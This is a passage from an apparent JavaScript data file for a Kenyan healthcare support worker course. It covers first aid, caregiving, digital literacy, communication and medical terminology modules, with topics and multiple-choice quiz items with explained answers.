opts:["Happiness","Excitement","Depression","Boredom"], ans:2, exp:"Refusal to eat, social withdrawal and persistent crying are hallmark signs of depression that require psychosocial assessment and intervention." }\n        ]\n      },\n      {\n        title: "Conduct Emotion and Social Support",\n        hours: 30,\n        topics: [\n          "Building therapeutic rapport: introduction, open communication, non-verbal cues",\n          "Family support sessions: meetings and informal discussions",\n          "Psychosocial resources: spiritual support, welfare groups, fellowships",\n          "Social inclusion strategies and quality of life improvement",\n          "Building self-confidence and supporting acceptance of condition"\n        ],\n        methods: ["Practical","Interview","Third Party Reports","Written Tests","Project"],\n        quiz: [\n          { q:"What is ''rapport'' in the context of psychosocial care?", opts:["A medical procedure","A trusting, respectful relationship between caregiver and patient","A type of medication","A hospital form"], ans:1, exp:"Rapport is a harmonious, trusting relationship built through open communication, empathy and consistent respectful interaction." },\n          { q:"Which of these is an example of a psychosocial community resource for a patient?", opts:["Surgical theatre","Support group or welfare group","Pharmacy store","Hospital kitchen"], ans:1, exp:"Support groups, welfare groups and spiritual communities provide social support networks that complement clinical care." }\n        ]\n      },\n      {\n        title: "Conduct Self-Care",\n        hours: 20,\n        topics: [\n          "Self-evaluation: daily checklists, setting limits, strengths and weaknesses analysis",\n          "Personal hygiene practices for the caregiver",\n          "Recognising and managing caregiver burnout",\n          "Recreational practices: rest, leisure, exercise",\n          "Maintaining boundaries in the care relationship"\n        ],\n        methods: ["Interview","Third Party Reports","Observation","Oral Questions","Individual/Group Assignment"],\n        quiz: [\n          { q:"Why is caregiver self-care important in healthcare support services?", opts:["It is not important","Prevents burnout, maintains mental health and ensures quality care delivery","Only for entertainment","Required by law only"], ans:1, exp:"Caregivers who neglect self-care risk burnout, reduced empathy and compromised care quality — self-care is a professional responsibility." },\n          { q:"A daily self-evaluation checklist helps a healthcare support worker to:", opts:["Complain about patients","Identify personal strengths, weaknesses and areas for improvement","Avoid doing work","Write medical prescriptions"], ans:1, exp:"Daily self-evaluation builds self-awareness, helping workers identify what they do well and where they need improvement or support." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 0,\n    code: "HW/CU/HBC/CR/04/3/MA",\n    title: "Pre-Departure Processes",\n    hours: 50, credits: 5,\n    desc: "Prepare for international work placements by researching destinations, processing travel documents and understanding work ethics abroad.",\n    outcomes: [\n      {\n        title: "Research Destination Country",\n        hours: 14,\n        topics: [\n          "Introduction to pre-departure training and its importance",\n          "Key terms: visa, work permit, residency, destination country",\n          "Factors to consider: culture, language, laws, climate, healthcare system",\n          "Sources of country information: embassies, official government portals",\n          "Risks and mitigation strategies for international placements"\n        ],\n        methods: ["Observation","Oral Questions","Third Party Report","Written Tests","Project"],\n        quiz: [\n          { q:"Why is cultural research about a destination country important before departure?", opts:["To learn new recipes","To respect local customs and avoid cultural misunderstandings","It is not important","To shop for gifts"], ans:1, exp:"Understanding cultural norms prevents misunderstandings, helps build positive working relationships and ensures respectful behaviour in the host country." }\n        ]\n      },\n      {\n        title: "Process Travel Documents",\n        hours: 12,\n        topics: [\n          "Types of travel documents: passport, visa, work permit, travel insurance",\n          "Passport application process and renewal procedures",\n          "Types of visas: work visa, medical professional visa, transit visa",\n          "Medical clearance certificates and vaccination records",\n          "Verification of document authenticity"\n        ],\n        methods: ["Observation","Oral Questions","Third Party Report","Written Tests"],\n        quiz: [\n          { q:"Which document grants a foreign national legal permission to work in a destination country?", opts:["Tourist visa","Passport","Work permit","Birth certificate"], ans:2, exp:"A work permit is a legal document issued by the destination country''s government authorising a foreign national to take employment there." },\n          { q:"What is travel insurance used for?", opts:["Booking hotel rooms","Covering medical emergencies, trip cancellations and losses abroad","Paying for visas","Obtaining a work permit"], ans:1, exp:"Travel insurance provides financial protection against medical emergencies, trip cancellations, lost baggage and other unforeseen events while abroad." }\n        ]\n      },\n      {\n        title: "Demonstrate Understanding of the Travel Process",\n        hours: 12,\n        topics: [\n          "Modes of international transport: air, sea",\n          "Airport procedures: check-in, immigration, customs, boarding",\n          "Travel etiquette: dress code, behaviour, punctuality",\n          "Transit processes: connecting flights, transit visas",\n          "Arrival and reception services: port health, immigration clearance"\n        ],\n        methods: ["Observation","Oral Questions","Written Tests","Project"],\n        quiz: [\n          { q:"What is a ''transit visa''?", opts:["A visa for working abroad","A permit to pass through a country on the way to a final destination","A permanent residency visa","An emergency travel document"], ans:1, exp:"A transit visa permits a traveller to pass through a country briefly while en route to their final destination country." }\n        ]\n      },\n      {\n        title: "Establish Work Ethics and Legal Aspects of Destination Country",\n        hours: 12,\n        topics: [\n          "Work ethics abroad: punctuality, professionalism, cultural sensitivity",\n          "Types of remittances: sending money home, fees and regulations",\n          "Legal aspects of immigration: rights, responsibilities, employment contracts",\n          "Emerging trends in international healthcare migration",\n          "Organisations protecting migrant health workers"\n        ],\n        methods: ["Observation","Oral Questions","Written Tests","Project"],\n        quiz: [\n          { q:"What are ''remittances'' in the context of working abroad?", opts:["Travel documents","Money sent back home by a migrant worker","Employer benefits","Hospital records"], ans:1, exp:"Remittances are funds sent by migrant workers to their families or relatives in their home country — they are economically significant for Kenya." }\n        ]\n      }\n    ]\n  },\n\n  // MODULE II\n  {\n    module: 1,\n    code: "HW/CU/CG/CC/01/4/MA",\n    title: "First Aid Services",\n    hours: 80, credits: 8,\n    desc: "Assess injuries/illnesses, provide first aid interventions, evaluate outcomes and wind up the first aid process.",\n    outcomes: [\n      {\n        title: "Assess the Nature and Extent of Injury or Illness",\n        hours: 20,\n        topics: [\n          "Principles of first aid: preserve life, prevent deterioration, promote recovery",\n          "Scene size-up: ensuring scene safety before approaching",\n          "Assessment methods: primary survey (ABCDE), secondary survey",\n          "Decision-making: triaging multiple casualties",\n          "Sourcing emergency services: EDCA, ambulance, 999/112"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"What does the ''ABCDE'' mnemonic stand for in patient assessment?", opts:["Always Be Careful During Emergencies","Airway, Breathing, Circulation, Disability, Exposure","Air, Blood, CPR, Drugs, Equipment","Assess, Breathe, Check, Decide, Exit"], ans:1, exp:"ABCDE (Airway, Breathing, Circulation, Disability, Exposure) is a systematic approach to assessing a critically ill or injured patient." },\n          { q:"What is the FIRST step when arriving at an emergency scene?", opts:["Start CPR immediately","Check for a pulse","Ensure the scene is safe before approaching","Call for food"], ans:2, exp:"Scene safety is always the first priority — a first aider who becomes a casualty cannot help anyone." },\n          { q:"Triaging in emergencies means:", opts:["Treating all patients simultaneously","Prioritising patients based on the severity of their condition","Waiting for a doctor","Documenting patient names"], ans:1, exp:"Triage is the process of sorting patients by the urgency of their medical needs to allocate care resources efficiently." }\n        ]\n      },\n      {\n        title: "Provide First Aid Intervention",\n        hours: 20,\n        topics: [\n          "Cardiopulmonary Resuscitation (CPR): adult, child and infant techniques",\n          "Management of burns, choking, fractures, drowning, poisoning, snake bites",\n          "Assisting patients with asthma, epilepsy, hyperglycaemia, hypoglycaemia",\n          "Bleeding control: direct pressure, wound packing, tourniquet application",\n          "Effective handover communication to medical personnel"\n        ],\n        methods: ["Practical Assessment","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"What is the correct compression-to-breath ratio for adult CPR?", opts:["15:2","30:2","10:1","5:1"], ans:1, exp:"The standard ratio for adult CPR is 30 chest compressions followed by 2 rescue breaths, per international resuscitation guidelines." },\n          { q:"A patient is choking and cannot cough, speak or breathe. What should you do?", opts:["Give them water","Perform abdominal thrusts (Heimlich manoeuvre)","Lay them flat","Wait to see if it clears"], ans:1, exp:"Abdominal thrusts (Heimlich manoeuvre) create an artificial cough to expel a lodged object from the airway." },\n          { q:"What is the primary treatment for a minor burn?", opts:["Apply butter or oil","Cool under running water for at least 10 minutes","Cover with a dry cloth only","Pop any blisters immediately"], ans:1, exp:"Cooling the burn under cool (not cold) running water for at least 10 minutes reduces tissue damage and pain." }\n        ]\n      },\n      {\n        title: "Evaluate First Aid Services",\n        hours: 10,\n        topics: [\n          "Evaluating casualty response to interventions given",\n          "Self-evaluation of the first aider''s performance",\n          "Referral procedures: indications for hospital referral",\n          "Documentation: first aid records, incident forms",\n          "Handover process to medical personnel or family"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests"],\n        quiz: [\n          { q:"When should a casualty be referred to a hospital after first aid?", opts:["Only for broken bones","When any condition is beyond the scope of first aid management","Never","After one hour always"], ans:1, exp:"Referral is needed when a patient''s condition requires medical diagnosis, further treatment or monitoring beyond what first aid can provide." }\n        ]\n      },\n      {\n        title: "Wind-Up First Aid",\n        hours: 10,\n        topics: [\n          "Completing first aid documentation and incident reports",\n          "Waste disposal: sharps, contaminated materials, biohazard waste",\n          "Restocking the first aid kit after use",\n          "Reporting requirements: legal and professional obligations",\n          "Debrief and emotional support for first aider"\n        ],\n        methods: ["Practical Assessment","Portfolio of Evidence","Written Tests"],\n        quiz: [\n          { q:"Where should sharps (needles, lancets) be disposed of after first aid use?", opts:["General waste bin","Sharps container / puncture-resistant container","On the floor","Down the drain"], ans:1, exp:"Sharps must be placed in dedicated sharps containers to prevent needle-stick injuries and comply with infection control regulations." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 1,\n    code: "HW/CU/CG/CR/01/4/MA",\n    title: "Caregiving Catering Services",\n    hours: 180, credits: 18,\n    desc: "Prepare, cook and present nutritious meals in a care setting, maintaining food safety and hygiene throughout.",\n    outcomes: [\n      {\n        title: "Perform Previous Preparation",\n        hours: 60,\n        topics: [\n          "Using PPE correctly: aprons, gloves, hair nets, non-slip shoes",\n          "Airing and preparing the production room before cooking",\n          "Selecting and assembling cleaning materials and equipment",\n          "Cleaning food production tools and surfaces as per workplace procedures",\n          "Collecting and accurately weighing ingredients as per recipe"\n        ],\n        methods: ["Practical","Interview","Third Party Reports","Written Tests","Project"],\n        quiz: [\n          { q:"Why should a caregiver wear a hair net when preparing food?", opts:["Fashion purposes","To prevent hair falling into food, which is a contamination risk","It is optional","To keep hair dry"], ans:1, exp:"Hair nets prevent physical contamination of food — a hair in food is both a hygiene issue and a complaint trigger." },\n          { q:"What is the purpose of weighing ingredients as per the recipe?", opts:["To make the recipe take longer","To ensure consistent nutritional value and correct flavour","Just for appearance","To use more food"], ans:1, exp:"Accurate weighing ensures consistency in taste, nutritional content and portion size, especially important for therapeutic diets." }\n        ]\n      },\n      {\n        title: "Prepare Main Meal",\n        hours: 60,\n        topics: [\n          "Selecting correct cooking equipment for each food type",\n          "Applying cooking methods: boiling, steaming, roasting, frying, braising",\n          "Maintaining correct temperatures as per recipe specifications",\n          "Adhering to timings to ensure food safety and quality",\n          "Adjusting recipes for therapeutic diets (diabetic, low-sodium, soft diets)"\n        ],\n        methods: ["Practical","Interview","Third Party Reports","Written Tests"],\n        quiz: [\n          { q:"Which cooking method best preserves water-soluble vitamins in vegetables?", opts:["Deep frying","Boiling in a large pot","Steaming","Microwaving with water"], ans:2, exp:"Steaming preserves vitamins better than boiling because the food doesn''t sit in water, which leaches water-soluble vitamins like C and B." },\n          { q:"A recipe requires baking at 180°C for 30 minutes. Why must this be adhered to strictly?", opts:["Just for taste","Temperature and time ensure food safety (killing pathogens) and correct texture","To save electricity","Ovens only have one setting"], ans:1, exp:"Precise temperature and time destroy harmful microorganisms and achieve the correct texture, especially critical in care settings." }\n        ]\n      },\n      {\n        title: "Present Main Meal",\n        hours: 40,\n        topics: [\n          "Holding hot food at correct serving temperatures (above 63°C)",\n          "Portioning food correctly for patient dietary requirements",\n          "Garnishing to make meals appealing and stimulate appetite",\n          "Presenting meals in correct, clean, appropriate equipment",\n          "Considering patient dignity in meal presentation"\n        ],\n        methods: ["Practical","Interview","Third Party Reports","Written Tests"],\n        quiz: [\n          { q:"At what minimum temperature must hot food be held to remain safe for service?", opts:["50°C","63°C","45°C","80°C"], ans:1, exp:"Food safety regulations require hot food to be held above 63°C to prevent bacterial growth in the danger zone (8°C–63°C)." }\n        ]\n      },\n      {\n        title: "Perform Post Production Tasks",\n        hours: 20,\n        topics: [\n          "Cleaning and storing tools and equipment after use",\n          "Sanitising work surfaces and floors to food-safe standards",\n          "Waste disposal procedures: food waste, packaging, hazardous materials",\n          "Completing catering records and portion documentation",\n          "Reporting equipment defects to supervisor"\n        ],\n        methods: ["Practical","Interview","Third Party Reports","Written Tests"],\n        quiz: [\n          { q:"What is the correct order for washing kitchen equipment?", opts:["Rinse, wash, sanitise, dry","Wash, rinse, sanitise, dry/store","Sanitise, wash, rinse","Dry, sanitise, wash"], ans:1, exp:"The correct sequence is: wash (remove debris), rinse (remove soap), sanitise (kill remaining pathogens), then dry/store properly." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 1,\n    code: "HW/CU/CG/CR/02/4/MA",\n    title: "Special Needs Care Support",\n    hours: 120, credits: 12,\n    desc: "Provide specialised care for geriatric, terminally ill, mentally ill, disabled and special needs children, plus psychosocial support.",\n    outcomes: [\n      {\n        title: "Provide Care for Geriatrics",\n        hours: 20,\n        topics: [\n          "Assessing client home environment for safety and suitability",\n          "Common geriatric conditions: dementia, osteoporosis, incontinence",\n          "Geriatric care activities: mobility assistance, fall prevention, skin care",\n          "Developing a working contract with elderly clients",\n          "Preparing geriatric care reports and referrals"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"What is a key safety concern when caring for elderly patients at home?", opts:["Too much exercise","Falls — especially in bathrooms and on stairs","Overeating","Excessive sleep"], ans:1, exp:"Falls are the leading cause of injury and death in older adults — fall prevention through environmental modifications is a priority in geriatric care." },\n          { q:"Dementia is characterised by:", opts:["Improved memory over time","Progressive cognitive decline affecting memory, thinking and daily function","Strong physical health","Increased appetite"], ans:1, exp:"Dementia is a progressive neurological condition causing decline in memory, reasoning, communication and ability to perform daily activities." }\n        ]\n      },\n      {\n        title: "Provide Care for Terminally Ill Patients",\n        hours: 20,\n        topics: [\n          "Types of terminal illnesses: cancer, end-stage renal disease, end-stage heart failure",\n          "Palliative vs curative care: goals and principles",\n          "Pain assessment and comfort measures",\n          "Emotional support for patient and family: grief stages",\n          "Documentation and referral in end-of-life care"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests"],\n        quiz: [\n          { q:"What is the primary goal of palliative care?", opts:["Curing the disease","Maximising quality of life by managing pain, symptoms and providing emotional support","Aggressive treatment","Speeding up death"], ans:1, exp:"Palliative care focuses on improving quality of life through symptom management, emotional support and dignity — it does not aim to cure." },\n          { q:"The five stages of grief (Kübler-Ross model) include:", opts:["Joy, love, sadness, hope, peace","Denial, anger, bargaining, depression, acceptance","Shock, fear, confusion, sleep, recovery","Denial, anxiety, peace, love, acceptance"], ans:1, exp:"The Kübler-Ross model describes five stages: Denial, Anger, Bargaining, Depression, Acceptance — helping caregivers understand patient emotional journeys." }\n        ]\n      },\n      {\n        title: "Provide Care for Mentally Ill Patients",\n        hours: 20,\n        topics: [\n          "Types of mental illness: schizophrenia, bipolar disorder, PTSD, anxiety disorders",\n          "De-escalation techniques for agitated patients",\n          "Medication adherence support and monitoring side effects",\n          "Communication strategies: clear, calm, non-threatening",\n          "Safeguarding and reporting concerns about patient safety"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"Which communication approach is most effective with an agitated mentally ill patient?", opts:["Shout louder than the patient","Speak calmly, use simple language, give personal space","Restrain immediately","Ignore the patient"], ans:1, exp:"Calm, clear communication delivered from a non-threatening stance reduces agitation and builds trust with mentally ill patients." }\n        ]\n      },\n      {\n        title: "Provide Care for Disabled",\n        hours: 20,\n        topics: [\n          "Types of disabilities: physical, sensory, intellectual, psychosocial",\n          "Principles: dignity, independence, inclusion, person-centred care",\n          "Assistive devices: wheelchairs, crutches, hearing aids, communication boards",\n          "Disability care activities: mobility support, daily living assistance",\n          "Disability rights and legislation in Kenya"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"What term describes care that puts the individual''s preferences, needs and values at the centre of all decisions?", opts:["Medical model care","Person-centred care","Routine care","Hospital-centred care"], ans:1, exp:"Person-centred care places the individual''s preferences, needs and values at the heart of all decisions, promoting dignity and autonomy." }\n        ]\n      },\n      {\n        title: "Provide Care for Children with Special Needs",\n        hours: 20,\n        topics: [\n          "Types of special needs in children: autism spectrum disorder, cerebral palsy, ADHD, Down syndrome",\n          "Adapted communication techniques for children",\n          "Stimulation activities: sensory play, therapeutic exercises",\n          "Safeguarding children: recognising signs of abuse or neglect",\n          "Working with parents/guardians in the care team"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"Autism Spectrum Disorder (ASD) is characterised by:", opts:["Only intellectual disability","Difficulties in social communication and repetitive behaviours, with varying severity","Only physical disability","Hearing loss"], ans:1, exp:"ASD is a neurodevelopmental condition characterised by differences in social communication, sensory processing and repetitive behaviours, existing on a spectrum of severity." }\n        ]\n      },\n      {\n        title: "Conduct Patient Psychosocial Support Activities",\n        hours: 20,\n        topics: [\n          "Types of psychosocial conditions: grief, trauma, social isolation, anxiety",\n          "Psychosocial assessment tools: observation, interviewing, questionnaires",\n          "Preparing a psychosocial support contract with the patient",\n          "Types of psychosocial support: emotional, informational, social",\n          "Documenting and reporting psychosocial interventions"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"What is the difference between emotional support and informational support?", opts:["They are identical","Emotional support provides empathy and comfort; informational support provides guidance and education","Informational is more important","Emotional support is only for children"], ans:1, exp:"Emotional support addresses feelings and wellbeing through empathy; informational support provides knowledge, resources and guidance to help patients make decisions." }\n        ]\n      }\n    ]\n  },\n\n  // MODULE III\n  {\n    module: 2,\n    code: "HW/CU/HSS/BC/01/5/MA",\n    title: "Digital Literacy",\n    hours: 40, credits: 4,\n    desc: "Operate computer devices, perform tasks using office applications, manage data, communicate online and apply cybersecurity skills.",\n    outcomes: [\n      {\n        title: "Operate Computer Devices",\n        hours: 6,\n        topics: [\n          "Types of devices: desktop, laptop, tablet — components and functions",\n          "Input/output devices: keyboard, mouse, monitor, printer",\n          "Storage: RAM, hard drives, flash drives, cloud storage",\n          "Computer ports: USB, HDMI, VGA, Ethernet",\n          "File management: creating, naming, organising, deleting folders"\n        ],\n        methods: ["Observation","Oral Assessment","Portfolio of Evidence","Written Assessment","Practical"],\n        quiz: [\n          { q:"What type of storage temporarily holds data while the computer is running?", opts:["Hard Drive","USB Flash Drive","RAM (Random Access Memory)","CD-ROM"], ans:2, exp:"RAM is volatile memory that temporarily stores active data while the computer is on — it is cleared when the computer is switched off." },\n          { q:"Which port is used to connect a computer to a high-definition monitor or TV?", opts:["USB-A","Ethernet","HDMI","3.5mm audio"], ans:2, exp:"HDMI (High-Definition Multimedia Interface) transmits both high-definition video and audio signals to monitors, TVs and projectors." }\n        ]\n      },\n      {\n        title: "Solve Tasks Using Computer Devices",\n        hours: 14,\n        topics: [\n          "Word processing: creating, editing, formatting and printing documents",\n          "Spreadsheets: data entry, basic formulas, tables",\n          "Web browsing: searching, evaluating online health information",\n          "Email: sending, receiving, organising medical correspondence",\n          "Netiquette: professional online communication standards"\n        ],\n        methods: ["Observation","Oral Assessment","Portfolio of Evidence","Written Assessment","Project","Practical"],\n        quiz: [\n          { q:"In a word processor, what function does ''Ctrl + Z'' perform?", opts:["Save the document","Undo the last action","Print the document","Copy selected text"], ans:1, exp:"Ctrl + Z is the universal shortcut to undo the most recent action in most word processing and computing applications." },\n          { q:"When searching for health information online, what should you prioritise?", opts:["Social media posts","Websites with .gov, .org or peer-reviewed sources","The first result always","Pop-up advertisements"], ans:1, exp:"Official government, academic and professional organisation websites (.gov, .org, peer-reviewed journals) provide reliable, evidence-based health information." }\n        ]\n      },\n      {\n        title: "Apply Cybersecurity Skills",\n        hours: 4,\n        topics: [\n          "Types of cyber threats: phishing, malware, ransomware, identity theft",\n          "Password management: strong passwords, two-factor authentication",\n          "Antivirus software: installation, updates, scans",\n          "Data backup: offline and cloud backup procedures",\n          "Patient data protection: confidentiality and privacy"\n        ],\n        methods: ["Observation","Oral Assessment","Portfolio of Evidence","Written Assessment"],\n        quiz: [\n          { q:"What is ''phishing''?", opts:["A type of computer virus","A fraudulent attempt to obtain sensitive information by impersonating a trusted entity","A data backup method","A type of antivirus software"], ans:1, exp:"Phishing involves deceptive emails, messages or websites that impersonate trusted organisations to trick users into revealing passwords or personal data." },\n          { q:"Why must patient data stored on computers be protected with strong passwords?", opts:["To make login harder for staff","To protect patient confidentiality, comply with data protection laws and prevent unauthorised access","Just for IT purposes","Passwords are optional"], ans:1, exp:"Patient data is highly sensitive — unauthorised access violates patient confidentiality, breaches data protection laws and can cause significant harm." }\n        ]\n      },\n      {\n        title: "Apply Job Entry Techniques",\n        hours: 2,\n        topics: [\n          "Types of job opportunities in healthcare support: salaried, self-employed, service provider",\n          "Curriculum vitae (CV): structure, content, dos and don''ts",\n          "Job application letter: format, addressing, signing off",\n          "Building a portfolio of evidence: certificates, awards, commendations",\n          "Interview skills: grooming, body language, articulation"\n        ],\n        methods: ["Observation","Oral Assessment","Portfolio of Evidence","Written Assessment"],\n        quiz: [\n          { q:"What is the recommended maximum length for a healthcare support CV?", opts:["10 pages","1–2 pages","No limit","5 pages minimum"], ans:1, exp:"A CV should ideally be 1–2 pages — concise, relevant and tailored to the specific job application to hold an employer''s attention." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 2,\n    code: "HW/CU/HSS/BC/02/5/MA",\n    title: "Communication Skills",\n    hours: 40, credits: 4,\n    desc: "Apply effective communication channels, written, non-verbal, oral and group communication skills in healthcare settings.",\n    outcomes: [\n      {\n        title: "Apply Communication Channels",\n        hours: 8,\n        topics: [\n          "Communication process: sender, message, channel, receiver, feedback",\n          "Principles of effective communication: clarity, conciseness, courtesy",\n          "Channels: verbal, non-verbal, written, electronic",\n          "Barriers to communication: noise, language, assumptions, cultural differences",\n          "Organisational communication flow: upward, downward, lateral"\n        ],\n        methods: ["Oral Questions","Written Assessment","Observation","Portfolio of Evidence","Practical Assessment"],\n        quiz: [\n          { q:"Which is NOT a barrier to effective communication?", opts:["Language differences","Noise","Clear and simple language","Cultural misunderstandings"], ans:2, exp:"Clear and simple language facilitates communication — it removes barriers rather than creating them." },\n          { q:"Communication flowing from a healthcare support worker to a senior nurse is an example of:", opts:["Lateral communication","Downward communication","Upward communication","Grapevine communication"], ans:2, exp:"Communication from a junior worker to a superior is upward communication — it includes reports, queries and suggestions." }\n        ]\n      },\n      {\n        title: "Apply Written Communication Skills",\n        hours: 8,\n        topics: [\n          "Types of written communication: letters, reports, forms, notes, emails",\n          "Elements: structure, grammar, punctuation, professional tone",\n          "Documenting patient care: accuracy, legibility, factual reporting",\n          "Writing incident reports: factual, objective, timely",\n          "Organisational requirements: approved abbreviations, formats"\n        ],\n        methods: ["Oral Assessment","Written Assessment","Observation","Portfolio of Evidence"],\n        quiz: [\n          { q:"In patient care documentation, entries should be:", opts:["Subjective and opinion-based","Factual, accurate, legible and timely","Written from memory only","Made by the most senior person only"], ans:1, exp:"Documentation must be factual, accurate, legible and completed promptly — errors or omissions can compromise patient safety and legal accountability." }\n        ]\n      },\n      {\n        title: "Apply Non-Verbal Communication Skills",\n        hours: 8,\n        topics: [\n          "Types of non-verbal communication: facial expressions, gestures, posture, touch",\n          "Importance of eye contact in building trust with patients",\n          "Professional workplace dress code and its communication impact",\n          "Personal space and proximity in patient interaction",\n          "Consistency between verbal and non-verbal messages"\n        ],\n        methods: ["Oral Assessment","Written Assessment","Observation","Portfolio of Evidence","Practical Assessment"],\n        quiz: [\n          { q:"When a caregiver says ''I am listening'' but looks at their phone, what problem does this create?", opts:["No problem","Conflicting verbal and non-verbal messages undermine trust","The patient should also look at their phone","It is standard practice"], ans:1, exp:"Inconsistency between words and non-verbal behaviour creates confusion and erodes trust — body language must align with verbal communication." }\n        ]\n      },\n      {\n        title: "Apply Oral Communication Skills",\n        hours: 8,\n        topics: [\n          "Types: face-to-face, telephone, handover, ward rounds, patient education",\n          "Effective questioning: open vs closed questions in patient assessment",\n          "Active listening techniques: paraphrasing, summarising, clarifying",\n          "Workplace etiquette: appropriate language, volume, tone",\n          "SBAR tool: Situation, Background, Assessment, Recommendation"\n        ],\n        methods: ["Oral Assessment","Written Assessment","Observation","Portfolio of Evidence","Practical Assessment"],\n        quiz: [\n          { q:"The SBAR communication tool stands for:", opts:["Say, Be, Ask, Report","Situation, Background, Assessment, Recommendation","Send, Brief, Answer, Reply","Start, Build, Assess, Respond"], ans:1, exp:"SBAR is a structured communication framework for healthcare handovers: Situation, Background, Assessment, Recommendation — improving safety and clarity." },\n          { q:"An ''open question'' in patient assessment is:", opts:["A question answered with Yes or No","A question inviting a detailed, free-form response","A closed medical record","A multiple choice question"], ans:1, exp:"Open questions (e.g., ''Tell me about your pain'') invite patients to provide detailed information, revealing more than closed yes/no questions." }\n        ]\n      },\n      {\n        title: "Apply Group Communication Skills",\n        hours: 8,\n        topics: [\n          "Establishing rapport in a team: building trust and psychological safety",\n          "Facilitating group discussions and resolving issues",\n          "Developing action plans from team meetings",\n          "Conflict resolution techniques in healthcare teams",\n          "Turn-taking, teamwork and inclusive participation"\n        ],\n        methods: ["Oral Assessment","Written Assessment","Observation","Portfolio of Evidence","Practical Assessment"],\n        quiz: [\n          { q:"Which conflict resolution approach seeks a solution that benefits all parties?", opts:["Win-lose","Avoidance","Win-win (collaborative)","Forcing"], ans:2, exp:"The win-win collaborative approach seeks solutions that address the needs of all parties — it is most effective for maintaining positive team relationships." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 2,\n    code: "HW/CU/HSS/CC/01/5/MA",\n    title: "Medical Terminology",\n    hours: 40, credits: 4,\n    desc: "Understand and apply medical abbreviations, acronyms and terminology related to body systems and patient communication.",\n    outcomes: [\n      {\n        title: "Demonstrate Understanding of Medical Acronyms",\n        hours: 10,\n        topics: [\n          "Common medical acronyms: BP, HR, IV, IM, PO, PRN, TDS, BD, OD",\n          "Medical abbreviations in prescriptions and charts",\n          "Terms associated with drugs: generic vs brand names, routes, frequencies",\n          "Department-specific terminology: ICU, OPD, A&E, OT, HDU",\n          "Difference between medical acronyms and abbreviations"\n        ],\n        methods: ["Written Tests","Oral Presentations","Demonstrations","Oral Questioning"],\n        quiz: [\n          { q:"What does ''BP'' stand for in medical terminology?", opts:["Body Pain","Blood Pressure","Bone Procedures","Basic Prescriptions"], ans:1, exp:"BP stands for Blood Pressure — one of the four main vital signs measured routinely in patient assessments." },\n          { q:"A drug prescribed ''PRN'' should be given:", opts:["Every 4 hours","When required / as needed","Twice daily","Before meals"], ans:1, exp:"PRN is from Latin ''pro re nata'' meaning ''as needed'' — the drug is given only when the patient requires it, based on defined criteria." }\n        ]\n      },\n      {\n        title: "Interpret Medical Acronyms and Abbreviations",\n        hours: 10,\n        topics: [\n          "Word roots: cardio (heart), neuro (nerve), hepato (liver), osteo (bone)",\n          "Prefixes: hyper-, hypo-, brady-, tachy-, pre-, post-",\n          "Suffixes: -itis (inflammation), -ectomy (removal), -plasty (repair), -oma (tumour)",\n          "Building medical words from components",\n          "Common medical abbreviations in patient notes"\n        ],\n        methods: ["Written Tests","Oral Presentations","Demonstrations","Oral Questioning"],\n        quiz: [\n          { q:"What does the suffix ''-itis'' mean in medical terminology?", opts:["Removal of","Inflammation of","Study of","Tumour"], ans:1, exp:"''-itis'' means inflammation — e.g., appendicitis (inflammation of the appendix), gastritis (inflammation of the stomach)." },\n          { q:"The prefix ''tachy-'' means:", opts:["Slow","Under/below","Fast/rapid","Above"], ans:2, exp:"''Tachy-'' means rapid — e.g., tachycardia (fast heart rate above 100bpm), tachypnoea (rapid breathing)." }\n        ]\n      },\n      {\n        title: "Interpret Medical Terms for Body Systems",\n        hours: 10,\n        topics: [\n          "Cardiovascular terms: arrhythmia, hypertension, angina, infarction",\n          "Respiratory terms: dyspnoea, apnoea, bronchospasm, pneumothorax",\n          "Gastrointestinal terms: dysphagia, emesis, diarrhoea, constipation",\n          "Neurological terms: paralysis, seizure, aphasia, ataxia",\n          "Musculoskeletal terms: fracture, dislocation, sprain, arthralgia"\n        ],\n        methods: ["Written Tests","Oral Presentations","Demonstrations","Oral Questioning"],\n        quiz: [\n          { q:"''Dyspnoea'' means:", opts:["Abnormal heart rhythm","Difficulty breathing","Painful swallowing","Loss of speech"], ans:1, exp:"Dyspnoea means difficulty or laboured breathing — it is a common symptom in respiratory, cardiac and anaemic conditions." },\n          { q:"''Hypertension'' refers to:", opts:["Low blood pressure","High blood sugar","High blood pressure","Low body temperature"], ans:2, exp:"Hypertension (hyper = above, tension = pressure) means persistently elevated blood pressure — a major risk factor for stroke and heart disease." }\n        ]\n      },\n      {\n        title: "Meet Communication Needs of Clients",\n        hours: 10,\n        topics: [\n          "Translating medical terminology into plain language for patients",\n          "Sharing health information appropriately based on instructions",\n          "Adjusting communication for health literacy levels",\n          "Written and verbal patient education techniques",\n          "Maintaining patient confidentiality when sharing information"\n        ],\n        methods: ["Written Tests","Oral Presentations","Demonstrations","Oral Questions"],\n        quiz: [\n          { q:"Why is it important to avoid using medical jargon when communicating with patients?", opts:["Patients prefer complex language","Medical terms may confuse patients, leading to misunderstanding of their care","It saves time","Doctors prefer it"], ans:1, exp:"Plain language ensures patients understand their condition and care plan, improving compliance, reducing anxiety and respecting their right to information." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 2,\n    code: "HW/CU/HSS/CC/04/5/MA",\n    title: "Common Diseases Control",\n    hours: 80, credits: 6,\n    desc: "Understand communicable and non-communicable diseases and support their prevention and management in healthcare settings.",\n    outcomes: 